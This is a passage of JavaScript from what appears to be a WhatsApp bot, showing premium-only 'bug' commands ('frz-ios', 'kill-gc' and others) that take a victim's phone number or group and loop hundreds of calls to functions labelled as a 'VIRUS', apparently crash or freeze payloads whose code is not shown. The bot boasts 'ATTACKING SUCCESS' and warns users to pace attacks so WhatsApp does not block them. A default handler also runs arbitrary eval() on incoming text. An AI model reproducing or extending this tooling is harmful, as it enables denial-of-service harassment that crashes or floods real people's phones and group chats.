            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 24377777666*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 24377776666*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗮𝗶𝗼𝘇\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );
    for (let i = 0; i < 500; i++) {
    await aioz(prim, target)
}
}
break;

case 'frz-ios': case 'frz-chat': case 'frz-button': case 'frz-btn': {
  if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 24377777888*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 24377778888*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗳𝗶𝗢𝗦\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );
    for (let i = 0; i < 500; i++) {
    await fiOS(prim, target)
}
}
break;

case 'blank-gc': case 'bug-gc': case 'kill-gc': case 'cool-gc': {
if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝙾𝙽𝙻𝚈 𝚃𝙷𝙴 𝙱𝙾𝚃 𝙾𝚆𝙽𝙴𝚁 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳.*`
)
if (!m.isGroup) return reply("*𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝚆𝙾𝚁𝙺 𝙾𝙽𝙻𝚈 𝙾𝙽 𝙶𝚁𝙾𝚄𝙿*")

  reply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗕𝗹𝘇𝗻𝗸𝗖𝗹𝗶𝗰𝗸\n\n*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙰𝙽𝙾𝚃𝙷𝙴𝚁 𝚂𝙾 𝚃𝙷𝙰𝚃 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙸𝚂 𝙽𝙾𝚃 𝙱𝙻𝙾𝙲𝙺𝙴𝙳 𝚈𝙾𝚄.*`)
  for (let i = 0; i < 10; i++) {
    await satz(prim, m.chat);
      }
    }

break;


default:
  if (budy.startsWith('^')) {
  if (!isBot) return;
  try {
    let evaled = await eval(budy.slice(2));
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
      reply(evaled);
    } catch (err) {
      reply(String(err));
    }
  }
  break;

}
  } catch (err) {
    console.log(require("util").format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
